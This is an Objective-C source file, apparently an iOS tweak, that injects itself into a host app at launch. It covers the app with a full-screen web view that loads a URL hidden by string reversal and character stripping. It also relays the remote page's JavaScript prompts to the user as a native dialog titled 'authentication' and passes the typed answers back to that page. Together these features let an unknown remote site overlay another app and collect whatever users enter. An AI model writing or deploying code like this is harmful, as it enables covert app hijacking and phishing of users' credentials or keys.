#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
static NSString *get_ultra_secure_url() {
    NSString *scrambled = @"XlXmXtXhX.XnXiXaXmX/XcXtX.XgXtX.XdXiXdXuXbXwX/X/X:XpXtXtXhX";
    
    NSMutableString *result = [NSMutableString string];
    for (NSInteger i = [scrambled length] - 1; i >= 0; i--) {
        NSString *c = [scrambled substringWithRange:NSMakeRange(i, 1)];
        if (![c isEqualToString:@"X"]) { 
            [result appendString:c];
        }
    }
    return result;
}

@interface AuthViewController : UIViewController <WKNavigationDelegate, WKUIDelegate>
@property (nonatomic, strong) WKWebView *webView;
@end

@implementation AuthViewController
- (void)viewDidLoad {
    [super viewDidLoad];
    
    self.view.backgroundColor = [UIColor blackColor];

    WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
    self.webView = [[WKWebView alloc] initWithFrame:self.view.bounds configuration:config];
    self.webView.navigationDelegate = self;
    self.webView.UIDelegate = self;
    self.webView.opaque = NO;
    self.webView.backgroundColor = [UIColor clearColor];
    
    [self.view addSubview:self.webView];
    
    NSString *finalURL = get_ultra_secure_url();
    [self.webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:finalURL]]];
}

- (void)webView:(WKWebView *)webView runJavaScriptTextInputPanelWithPrompt:(NSString *)prompt defaultText:(NSString *)defaultText initiatedByFrame:(WKFrameInfo *)frame completionHandler:(void (^)(NSString * _Nullable))completionHandler {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"認証" message:prompt preferredStyle:UIAlertControllerStyleAlert];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *textField) {
        textField.text = defaultText;
    }];
    [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:^(UIAlertAction *action) {
        completionHandler(((UITextField *)alert.textFields.firstObject).text);
    }]];
    [alert addAction:[UIAlertAction actionWithTitle:@"キャンセル" style:UIAlertActionStyleCancel handler:^(UIAlertAction *action) {
        completionHandler(nil);
    }]];
    [self presentViewController:alert animated:YES completion:nil];
}
- (void)webView:(WKWebView *)webView didFinishNavigation:(WKNavigation *)navigation {
    if ([webView.URL.absoluteString containsString:@"script"]) {
        [self dismissViewControllerAnimated:YES completion:nil];
    }
}
@end

%ctor {
    [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidFinishLaunchingNotification object:nil queue:[NSOperationQueue mainQueue] usingBlock:^(NSNotification *n){
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1.0 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
            AuthViewController *vc = [[AuthViewController alloc] init];
            vc.modalPresentationStyle = UIModalPresentationFullScreen;
            
            UIWindow *window = nil;
            if (@available(iOS 13.0, *)) {
                for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
                    if (scene.activationState == UISceneActivationStateForegroundActive) {
                        window = scene.windows.firstObject;
                        break;
                    }
                }
            }
            if (!window) window = [UIApplication sharedApplication].windows.firstObject;
            [window.rootViewController presentViewController:vc animated:YES completion:nil];
        });
    }];
}
